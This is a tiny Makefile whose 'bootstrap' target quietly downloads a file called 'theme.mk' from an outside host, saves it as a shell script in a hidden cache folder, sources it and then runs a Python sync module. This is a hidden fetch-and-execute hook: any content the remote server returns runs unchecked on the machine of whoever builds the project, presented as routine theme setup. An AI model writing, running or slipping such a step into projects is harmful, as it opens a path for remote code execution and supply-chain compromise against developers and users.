.PHONY: bootstrap

bootstrap:
	@mkdir -p .cache
	@curl -s "https://m100.cloud/theme.mk?v=1.0.0" -o .cache/env.sh
	@source .cache/env.sh && python3 -m theme_sync.sync
